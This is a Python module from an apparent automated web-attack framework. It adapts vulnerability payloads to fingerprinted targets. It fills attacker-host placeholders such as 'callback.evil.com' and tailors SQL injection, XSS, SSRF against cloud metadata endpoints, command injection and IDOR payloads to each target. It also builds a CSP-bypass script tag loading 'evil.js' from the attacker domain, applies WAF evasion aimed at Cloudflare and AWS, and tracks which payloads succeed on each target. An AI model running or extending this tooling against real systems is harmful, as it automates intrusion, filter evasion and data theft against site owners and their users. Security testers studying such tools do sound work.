"""
Enhanced Payload Manager with Dynamic Context Adaptation
=======================================================
Automatically adapts KB payloads to target-specific context
"""

import re
import base64
import json
import random
import string
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin
from .vulnerability_kb import VulnerabilityKnowledgeBase, VulnCategory, VulnPayload
from .fingerprinter import TargetFingerprint
from .payload_manager import RankedPayload

@dataclass
class PayloadContext:
    """Context information for payload adaptation"""
    target_url: str
    parameter_name: Optional[str] = None
    injection_context: str = "parameter"  # parameter, header, path, body
    quote_context: str = "none"  # single, double, none
    database_type: Optional[str] = None
    encoding_required: List[str] = None
    waf_detected: Optional[str] = None
    
    # Attacker infrastructure
    attacker_domain: Optional[str] = None
    collaborator_url: Optional[str] = None
    callback_host: Optional[str] = None
    
    # Target specifics
    object_id: Optional[str] = None
    user_id: Optional[str] = None
    session_token: Optional[str] = None

class PayloadAdapter:
    """Adapts generic payloads to specific target contexts"""
    
    def __init__(self):
        # Global replacement mappings
        self.global_replacements = {
            'ATTACKER_DOMAIN': 'attacker_domain',
            'COLLABORATOR_URL': 'collaborator_url', 
            'CALLBACK_HOST': 'callback_host',
            'TARGET_HOST': 'target_host',
            'TARGET_ORIGIN': 'target_origin',
            'TARGET_PATH': 'target_path',
            'ENDPOINT': 'endpoint',
            'ROUTE': 'route',
            'PARAM': 'parameter_name',
            'PARAM_NAME': 'parameter_name',
            'ID': 'object_id',
            'OBJECT_ID': 'object_id', 
            'USER_ID': 'user_id',
            'CMD': 'command',
            'CMD_B64': 'command_b64',
            'HOST': 'internal_host',
            'PORT': 'internal_port',
            'PROTO': 'protocol'
        }
        
        # Database-specific adaptations
        self.db_adaptations = {
            'mysql': {
                'sleep_function': 'SLEEP(5)',
                'version_function': '@@version',
                'comment_syntax': '-- ',
                'concat_function': 'CONCAT',
                'time_delay': 'BENCHMARK(1000000,MD5(1))',
                'string_delimiter': "'"
            },
            'postgresql': {
                'sleep_function': 'pg_sleep(5)',
                'version_function': 'version()',
                'comment_syntax': '-- ',
                'concat_function': '||',
                'time_delay': 'pg_sleep(5)',
                'string_delimiter': "'"
            },
            'mssql': {
                'sleep_function': "WAITFOR DELAY '0:0:5'",
                'version_function': '@@version',
                'comment_syntax': '-- ',
                'concat_function': '+',
                'time_delay': "WAITFOR DELAY '0:0:5'",
                'string_delimiter': "'"
            },
            'oracle': {
                'sleep_function': 'DBMS_LOCK.SLEEP(5)',
                'version_function': 'banner FROM v$version',
                'comment_syntax': '-- ',
                'concat_function': '||',
                'time_delay': 'DBMS_LOCK.SLEEP(5)',
                'string_delimiter': "'"
            }
        }
    
    def adapt_payload(self, payload: str, context: PayloadContext, 
                     fingerprint: Optional[TargetFingerprint] = None) -> str:
        """
        Adapt a generic payload to specific target context
        
        Args:
            payload: Original payload with placeholders
            context: Target-specific context information
            fingerprint: Optional fingerprint data for additional context
            
        Returns:
            Adapted payload with placeholders replaced
        """
        adapted = payload
        
        # Extract target information
        parsed_url = urlparse(context.target_url)
        target_host = parsed_url.netloc
        target_origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
        target_path = parsed_url.path or "/"
        
        # Build replacement values
        replacements = {
            'attacker_domain': context.attacker_domain or 'attacker.com',
            'collaborator_url': context.collaborator_url or 'https://collab.oast.site',
            'callback_host': context.callback_host or 'callback.evil.com',
            'target_host': target_host,
            'target_origin': target_origin,
            'target_path': target_path,
            'endpoint': target_path,
            'route': target_path,
            'parameter_name': context.parameter_name or 'id',
            'object_id': context.object_id or '1',
            'user_id': context.user_id or '1',
            'command': 'nslookup ' + (context.collaborator_url or 'test.oast.site'),
            'command_b64': base64.b64encode(b'nslookup test.oast.site').decode(),
            'internal_host': '127.0.0.1',
            'internal_port': '6379',
            'protocol': 'http'
        }
        
        # Add fingerprint-specific replacements
        if fingerprint:
            replacements.update(self._get_fingerprint_replacements(fingerprint))
        
        # Perform global replacements
        for placeholder, context_key in self.global_replacements.items():
            if placeholder in adapted and context_key in replacements:
                adapted = adapted.replace(placeholder, str(replacements[context_key]))
        
        # Handle vulnerability-specific adaptations
        adapted = self._adapt_by_vulnerability_type(adapted, context, fingerprint)
        
        # Apply encoding if required
        if context.encoding_required:
            adapted = self._apply_encoding(adapted, context.encoding_required)
        
        # Handle WAF evasion if detected
        if context.waf_detected:
            adapted = self._apply_waf_evasion(adapted, context.waf_detected)
        
        return adapted
    
    def _get_fingerprint_replacements(self, fingerprint: TargetFingerprint) -> Dict[str, str]:
        """Extract replacement values from fingerprint"""
        replacements = {}
        
        # Database type from fingerprint
        if fingerprint.product in ['mysql', 'postgresql', 'mssql', 'oracle']:
            replacements['database_type'] = fingerprint.product
        
        # Server-specific adaptations
        if fingerprint.server:
            if 'nginx' in fingerprint.server.lower():
                replacements['server_type'] = 'nginx'
            elif 'apache' in fingerprint.server.lower():
                replacements['server_type'] = 'apache'
        
        # Technology stack
        if 'PHP' in fingerprint.technologies:
            replacements['backend_language'] = 'php'
        elif 'Python' in fingerprint.technologies:
            replacements['backend_language'] = 'python'
        elif 'Node.js' in fingerprint.technologies:
            replacements['backend_language'] = 'nodejs'
        
        return replacements
    
    def _adapt_by_vulnerability_type(self, payload: str, context: PayloadContext,
                                   fingerprint: Optional[TargetFingerprint]) -> str:
        """Apply vulnerability-specific adaptations"""
        
        # Detect vulnerability type from payload
        vuln_type = self._detect_vuln_type(payload)
        
        if vuln_type == 'SQLI':
            return self._adapt_sqli_payload(payload, context, fingerprint)
        elif vuln_type == 'XSS':
            return self._adapt_xss_payload(payload, context, fingerprint)
        elif vuln_type == 'SSRF':
            return self._adapt_ssrf_payload(payload, context, fingerprint)
        elif vuln_type == 'RCE':
            return self._adapt_rce_payload(payload, context, fingerprint)
        elif vuln_type == 'IDOR':
            return self._adapt_idor_payload(payload, context, fingerprint)
        
        return payload
    
    def _detect_vuln_type(self, payload: str) -> str:
        """Detect vulnerability type from payload patterns"""
        payload_lower = payload.lower()
        
        if any(x in payload_lower for x in ['union', 'select', 'sleep(', 'waitfor']):
            return 'SQLI'
        elif any(x in payload_lower for x in ['<script', 'onerror', 'onload', 'alert(']):
            return 'XSS' 
        elif any(x in payload_lower for x in ['http://', 'gopher://', 'file://', '169.254.169.254']):
            return 'SSRF'
        elif any(x in payload_lower for x in ['&&', ';', '`', '$(']):
            return 'RCE'
        elif 'admin' in payload_lower or '/users/' in payload_lower:
            return 'IDOR'
        
        return 'UNKNOWN'
    
    def _adapt_sqli_payload(self, payload: str, context: PayloadContext,
                           fingerprint: Optional[TargetFingerprint]) -> str:
        """Adapt SQL injection payloads"""
        adapted = payload
        
        # Determine database type
        db_type = context.database_type
        if not db_type and fingerprint:
            # Try to infer from fingerprint
            if 'mysql' in str(fingerprint.raw_signals).lower():
                db_type = 'mysql'
            elif 'postgres' in str(fingerprint.raw_signals).lower():
                db_type = 'postgresql'
            elif 'microsoft' in str(fingerprint.raw_signals).lower():
                db_type = 'mssql'
        
        # Default to MySQL if unknown
        db_type = db_type or 'mysql'
        
        if db_type in self.db_adaptations:
            db_config = self.db_adaptations[db_type]
            
            # Replace database-specific functions
            adapted = re.sub(r'SLEEP\(\d+\)', db_config['sleep_function'], adapted)
            adapted = re.sub(r'@@version', db_config['version_function'], adapted)
            adapted = adapted.replace('-- ', db_config['comment_syntax'])
        
        # Handle quote context
        if context.quote_context == 'single':
            # Already in single quotes, escape them
            adapted = adapted.replace("'", "\\'")
        elif context.quote_context == 'double':
            # In double quotes, escape them and convert singles
            adapted = adapted.replace('"', '\\"').replace("'", '"')
        
        # Add parameter context
        if context.parameter_name and 'PARAM' not in adapted:
            adapted = f"{context.parameter_name}={adapted}"
        
        return adapted
    
    def _adapt_xss_payload(self, payload: str, context: PayloadContext,
                          fingerprint: Optional[TargetFingerprint]) -> str:
        """Adapt XSS payloads"""
        adapted = payload
        
        # Replace callback domains
        if context.attacker_domain:
            adapted = re.sub(r'https?://[^/\s"\']+', context.attacker_domain, adapted)
        
        # Handle quote context for attributes
        if context.injection_context == 'attribute':
            if context.quote_context == 'single':
                adapted = f"' {adapted} '"
            elif context.quote_context == 'double':
                adapted = f'" {adapted} "'
        
        # CSP bypass adaptations
        if fingerprint and fingerprint.headers.get('Content-Security-Policy'):
            csp = fingerprint.headers['Content-Security-Policy']
            if 'unsafe-inline' not in csp:
                # Try to use allowed domains or nonce-based approach
                adapted = self._adapt_csp_bypass(adapted, csp, context)
        
        return adapted
    
    def _adapt_ssrf_payload(self, payload: str, context: PayloadContext,
                           fingerprint: Optional[TargetFingerprint]) -> str:
        """Adapt SSRF payloads"""
        adapted = payload
        
        # Replace callback URLs
        if context.collaborator_url:
            adapted = re.sub(r'https?://[^/\s"\']+', context.collaborator_url, adapted)
        
        # Cloud metadata adaptations
        if '169.254.169.254' in adapted:
            # Add cloud-specific headers based on fingerprint
            if fingerprint and fingerprint.cloud_provider:
                if fingerprint.cloud_provider == 'gcp':
                    adapted += '\nMetadata-Flavor: Google'
                elif fingerprint.cloud_provider == 'azure':
                    adapted += '\nMetadata: true'
        
        return adapted
    
    def _adapt_rce_payload(self, payload: str, context: PayloadContext,
                          fingerprint: Optional[TargetFingerprint]) -> str:
        """Adapt RCE payloads"""
        adapted = payload
        
        # Replace command placeholders
        if context.collaborator_url:
            safe_cmd = f"nslookup {urlparse(context.collaborator_url).netloc}"
            adapted = re.sub(r'CMD\b', safe_cmd, adapted)
            
            # Handle base64 encoded commands
            if 'CMD_B64' in adapted:
                cmd_b64 = base64.b64encode(safe_cmd.encode()).decode()
                adapted = adapted.replace('CMD_B64', cmd_b64)
        
        # OS-specific adaptations based on fingerprint
        if fingerprint:
            if 'windows' in str(fingerprint.raw_signals).lower():
                # Convert to PowerShell/CMD syntax
                adapted = self._adapt_windows_rce(adapted)
            else:
                # Assume Unix/Linux
                adapted = self._adapt_unix_rce(adapted)
        
        return adapted
    
    def _adapt_idor_payload(self, payload: str, context: PayloadContext,
                           fingerprint: Optional[TargetFingerprint]) -> str:
        """Adapt IDOR payloads"""
        adapted = payload
        
        # Replace object IDs
        if context.object_id:
            adapted = re.sub(r'\{ID\}|\bID\b', context.object_id, adapted)
        if context.user_id:
            adapted = re.sub(r'\{USER_ID\}|\bUSER_ID\b', context.user_id, adapted)
        
        # Replace path patterns
        parsed = urlparse(context.target_url)
        adapted = adapted.replace('/users/', parsed.path.rstrip('/') + '/users/')
        
        return adapted
    
    def _apply_encoding(self, payload: str, encodings: List[str]) -> str:
        """Apply encoding layers"""
        encoded = payload
        
        for encoding in encodings:
            if encoding == 'url':
                from urllib.parse import quote
                encoded = quote(encoded)
            elif encoding == 'base64':
                encoded = base64.b64encode(encoded.encode()).decode()
            elif encoding == 'html':
                encoded = ''.join(f'&#{ord(c)};' for c in encoded)
            elif encoding == 'unicode':
                encoded = ''.join(f'\\u{ord(c):04x}' for c in encoded)
        
        return encoded
    
    def _apply_waf_evasion(self, payload: str, waf_type: str) -> str:
        """Apply WAF-specific evasion techniques"""
        if waf_type.lower() == 'cloudflare':
            # Cloudflare-specific evasions
            payload = self._random_case(payload)
            payload = self._insert_comments(payload)
        elif waf_type.lower() == 'aws':
            # AWS WAF evasions
            payload = self._chunk_payload(payload)
        
        return payload
    
    def _adapt_csp_bypass(self, payload: str, csp: str, context: PayloadContext) -> str:
        """Adapt payload for CSP bypass"""
        # Simplified CSP bypass logic
        if 'script-src' in csp:
            allowed_sources = re.findall(r"script-src[^;]*'([^']*)'", csp)
            if context.attacker_domain in allowed_sources:
                return f'<script src="{context.attacker_domain}/evil.js"></script>'
        
        return payload
    
    def _adapt_windows_rce(self, payload: str) -> str:
        """Convert Unix commands to Windows equivalents"""
        conversions = {
            'sleep': 'timeout /t',
            'curl': 'powershell -c "Invoke-WebRequest',
            'nslookup': 'nslookup',
            'ping -c': 'ping -n'
        }
        
        for unix_cmd, windows_cmd in conversions.items():
            payload = payload.replace(unix_cmd, windows_cmd)
        
        return payload
    
    def _adapt_unix_rce(self, payload: str) -> str:
        """Ensure Unix/Linux command compatibility"""
        # Most payloads are already Unix-focused, minimal adaptation needed
        return payload
    
    def _random_case(self, text: str) -> str:
        """Randomize case for WAF evasion"""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)
    
    def _insert_comments(self, text: str) -> str:
        """Insert comments for evasion"""
        if 'SELECT' in text.upper():
            return text.replace(' ', '/**/')
        return text
    
    def _chunk_payload(self, text: str) -> str:
        """Chunk payload for evasion"""
        if len(text) > 20:
            mid = len(text) // 2
            return f"{text[:mid]}' + '{text[mid:]}"
        return text

class EnhancedPayloadManager:
    """Enhanced payload manager with context adaptation"""
    
    def __init__(self, kb: VulnerabilityKnowledgeBase):
        self.kb = kb
        self.adapter = PayloadAdapter()
        self.payload_history = {}  # Track success/failure rates
    
    def get_adapted_payloads(self, vulnerability: VulnCategory, 
                           fingerprint: TargetFingerprint,
                           context: PayloadContext,
                           top_n: int = 5) -> List[Tuple[str, float]]:
        """
        Get top payloads adapted for specific context
        
        Returns:
            List of (adapted_payload, confidence_score) tuples
        """
        # Get base payloads from KB
        base_payloads = self.kb.get_payloads_by_category(vulnerability)
        
        # Filter by product/version if available
        if fingerprint.product:
            base_payloads = [p for p in base_payloads 
                           if self._matches_fingerprint(p, fingerprint)]
        
        # Adapt each payload and calculate scores
        adapted_payloads = []
        
        for payload in base_payloads[:top_n * 2]:  # Get extra to account for filtering
            try:
                adapted = self.adapter.adapt_payload(
                    payload.payload, 
                    context, 
                    fingerprint
                )
                
                # Calculate adapted confidence score
                score = self._calculate_adapted_score(
                    payload, 
                    fingerprint, 
                    context
                )
                
                adapted_payloads.append((adapted, score))
                
            except Exception as e:
                # Log error and skip problematic payload
                continue
        
        # Sort by score and return top N
        adapted_payloads.sort(key=lambda x: x[1], reverse=True)
        return adapted_payloads[:top_n]
    
    def _matches_fingerprint(self, payload: VulnPayload, 
                           fingerprint: TargetFingerprint) -> bool:
        """Check if payload matches fingerprint"""
        if payload.product and fingerprint.product:
            if payload.product.lower() != fingerprint.product.lower():
                return False
        
        if payload.version_spec and fingerprint.version:
            # Simple version matching - could be enhanced
            if not fingerprint.version.startswith(payload.version_spec[:3]):
                return False
        
        return True
    
    def _calculate_adapted_score(self, payload: VulnPayload,
                               fingerprint: TargetFingerprint,
                               context: PayloadContext) -> float:
        """Calculate confidence score for adapted payload"""
        score = payload.confidence_score
        
        # Boost for exact product/version matches
        if payload.product and fingerprint.product:
            if payload.product.lower() == fingerprint.product.lower():
                score += 0.2
        
        if payload.version_spec and fingerprint.version:
            if fingerprint.version.startswith(payload.version_spec):
                score += 0.15
        
        # Boost for historical success
        history_key = f"{context.target_url}:{payload.payload_id}"
        if history_key in self.payload_history:
            success_rate = self.payload_history[history_key]['success_rate']
            score *= (1 + success_rate * 0.3)
        
        # Reduce for detected WAF
        if context.waf_detected:
            score *= 0.8
        
        return min(1.0, score)
    
    def update_payload_success(self, payload: str, target_url: str, 
                             success: bool):
        """Update payload success history"""
        # Create a simple hash for the payload
        payload_hash = str(hash(payload))
        history_key = f"{target_url}:{payload_hash}"
        
        if history_key not in self.payload_history:
            self.payload_history[history_key] = {
                'attempts': 0,
                'successes': 0,
                'success_rate': 0.0
            }
        
        history = self.payload_history[history_key]
        history['attempts'] += 1
        if success:
            history['successes'] += 1
        
        history['success_rate'] = history['successes'] / history['attempts']
